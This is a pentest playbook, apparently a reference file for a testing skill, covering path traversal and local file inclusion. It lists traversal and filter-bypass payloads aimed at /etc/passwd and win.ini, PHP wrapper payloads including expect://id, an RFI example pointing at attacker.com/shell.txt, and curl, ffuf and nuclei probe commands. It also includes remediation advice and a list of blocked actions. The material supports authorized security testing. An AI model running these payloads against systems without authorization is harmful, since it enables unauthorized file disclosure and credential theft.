@@ -1,0 +1,162 @@
+# Path Traversal / Local File Inclusion (LFI) — Playbook
+
+## Classification
+- **OWASP Top 10:** A01 — Broken Access Control
+- **CWE:** CWE-22 (Path Traversal), CWE-98 (PHP Remote File Inclusion)
+- **Severity:** High / Critical
+- **Scope:** Arbitrary file read, configuration disclosure, potential RCE
+
+## Types
+
+| Type | Description | Detection Hint |
+|------|-------------|----------------|
+| **Path Traversal** | User-controlled file path reads local files | `../../../etc/passwd` |
+| **Local File Inclusion (LFI)** | PHP `include()`-style inclusion of local files; may lead to RCE via log poisoning | Response includes rendered content of the included file |
+| **Remote File Inclusion (RFI)** | PHP includes a remote URL (more dangerous, less common in modern PHP) | `http://attacker.com/shell.txt` |
+
+## Detection Payloads
+
+Test each file‑related parameter (e.g., `file=`, `page=`, `path=`, `template=`, `include=`, `load=`, `doc=`).
+
+### Unix — classic traversal
+```
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../etc/hostname
+../../../../../../etc/issue
+```
+
+### Unix — bypass filters (double-encoding, nested, weird)
+```
+....//....//....//etc/passwd
+....//....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+..%252f..%252f..%252fetc/passwd
+..%c0%ae..%c0%ae/..%c0%ae..%c0%ae/etc/passwd
+```
+
+### Windows — classic traversal
+```
+..\..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\boot.ini
+```
+
+### URL encoding bypasses
+```
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e/etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%5c..%5c..%5cwindows%5cwin.ini
+```
+
+### Null byte injection (older systems — PHP < 5.3.4)
+```
+../../../etc/passwd%00
+../../../etc/passwd%00.html
+```
+
+### Wrapper-based LFI (PHP)
+```
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/read=convert.base64-encode/resource=config.php
+php://filter/zlib.deflate/convert.base64-encode/resource=../../../etc/passwd
+expect://id
+```
+
+## Tools
+
+| Tool | Usage |
+|------|-------|
+| **curl** | Manual probe: `curl -v 'http://target.com/page?file=../../../etc/passwd'` |
+| **ffuf** | LFI wordlist fuzzing: `ffuf -u 'http://target.com/page?file=FUZZ' -w /path/to/lfi-wordlist.txt -mc all` |
+| **nuclei** | Automated LFI scanning: `nuclei -t lfi/ -u 'http://target.com'` |
+| **Burp Suite** | Intruder with LFI payload lists; Repeater for manual testing |
+
+### Example: curl probe
+```bash
+curl -s 'http://target.com/page?file=../../../etc/passwd' | head -20
+# If you see "root:x:0:0:root:" — LFI confirmed
+```
+
+### Example: ffuf with LFI wordlist
+```bash
+ffuf -u 'http://target.com/page.php?file=FUZZ' \
+     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+     -mc all -fc 404,403,500
+```
+
+### Example: nuclei
+```bash
+nuclei -t lfi/ -u 'http://target.com' -v
+```
+
+## Internet Research Queries
+- `<product> path traversal`
+- `<CVE-ID> LFI PoC`
+- `LFI bypass techniques`
+- `PHP filter chain LFI RCE`
+- `log poisoning LFI`
+- `Windows path traversal IIS`
+- `LFI to RCE via /proc/self/environ`
+
+## Safe PoC
+
+Goal: **Demonstrate arbitrary file read access — without exfiltrating secrets.**
+
+1. **Read `/etc/passwd` — first 5 lines only** (this is a public, non-sensitive file):
+   ```bash
+   curl -s 'http://target.com/page?file=../../../etc/passwd' | head -5
+   ```
+
+2. **Read `/etc/hostname`** — proves file read without revealing secrets:
+   ```bash
+   curl -s 'http://target.com/page?file=../../../etc/hostname'
+   ```
+
+3. **PHP filter approach** (safe — reads source code without executing):
+   ```bash
+   curl -s 'http://target.com/page?file=php://filter/convert.base64-encode/resource=../../../etc/hostname'
+   ```
+
+4. Compare with a 404/error on a nonexistent file:
+   ```bash
+   curl -s 'http://target.com/page?file=nonexistent'
+   # Error/blank confirms the file read is real
+   ```
+
+## Evidence to Save
+
+Collect and save:
+- **Full HTTP request** (method, URL, headers, body)
+- **Full HTTP response** showing the file content read (first 5–10 lines sufficient)
+- For PHP wrappers, include the base64-decoded output alongside the raw response
+- Screenshot or terminal output confirming file read
+
+Store in `$ENG_DIR/evidence/exploitation/path-traversal/` with a descriptive filename:
+- `YYYY-MM-DD_lfi-passwd_request.txt`
+- `YYYY-MM-DD_lfi-passwd_response.txt`
+- `YYYY-MM-DD_lfi-hostname_response.txt`
+
+## Remediation Guidance
+
+| Control | Description |
+|---------|-------------|
+| **Input validation** | Reject any input containing `../`, `..\\`, or null bytes |
+| **Canonicalize paths** | Resolve the full path with `realpath()` and reject if it falls outside the allowed base directory |
+| **Chroot / jail** | Run the application in a restricted filesystem context |
+| **Avoid user input in file paths** | Use database-backed file references (e.g., file ID → path mapping) instead of direct user-supplied paths |
+| **PHP `open_basedir`** | Restrict file access to a specific directory tree |
+| **Disable dangerous PHP wrappers** | Disable `allow_url_include`, `allow_url_fopen` if not needed |
+|| **Application firewall** | Block path-traversal patterns at the WAF / reverse proxy level |
+
+## Stop Conditions
+- Generic baseline — see `skills/pentest/references/shared-safety.md` §Generic Stop Conditions (pause on unexpected behavior, scope breach, or WAF/IDS trip).
+
+## Blocked Actions
+- **Do NOT** read or store sensitive configuration files containing secrets (e.g., `.env`, `config/database.yml`, `wp-config.php`, `web.config` with connection strings)
+- **Do NOT** read `/etc/shadow`, SSH private keys (`~/.ssh/id_rsa`), or any credential store
+- **Do NOT** exfiltrate PII, PHI, or other regulated data found on the filesystem
+- **Do NOT** write files or attempt RFI that leads to RCE (e.g., uploading a web shell)
+- **Do NOT** chain LFI with log poisoning to achieve RCE unless explicitly authorized and in-scope
